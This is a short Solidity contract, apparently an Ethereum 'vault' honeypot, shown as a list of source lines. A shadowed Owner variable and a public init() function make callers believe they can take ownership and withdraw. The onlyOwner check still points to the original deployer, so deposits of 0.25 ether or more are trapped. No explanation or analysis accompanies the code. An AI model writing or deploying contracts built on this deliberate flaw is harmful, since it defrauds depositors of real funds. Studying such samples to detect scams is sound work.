['pragma solidity ^0.4.10;\n', '\n', 'contract Owned {\n', '    address public Owner;\n', '    function Owned() { Owner = msg.sender; }\n', '    modifier onlyOwner { require( msg.sender == Owner ); _; }\n', '}\n', '\n', 'contract ETHVault is Owned {\n', '    address public Owner;\n', '    mapping (address=>uint) public deposits;\n', '    \n', '    function init() { Owner = msg.sender; }\n', '    \n', '    function() payable { deposit(); }\n', '    \n', '    function deposit() payable {\n', '        if( msg.value >= 0.25 ether )\n', '            deposits[msg.sender] += msg.value;\n', '        else throw;\n', '    }\n', '    \n', '    function withdraw(uint amount) onlyOwner {\n', '        uint depo = deposits[msg.sender];\n', '        if( amount <= depo && depo > 0 )\n', '            msg.sender.send(amount);\n', '    }\n', '\n', '    function kill() onlyOwner {\n', '        require(this.balance == 0);\n', '        suicide(msg.sender);\n', '\t}\n', '}']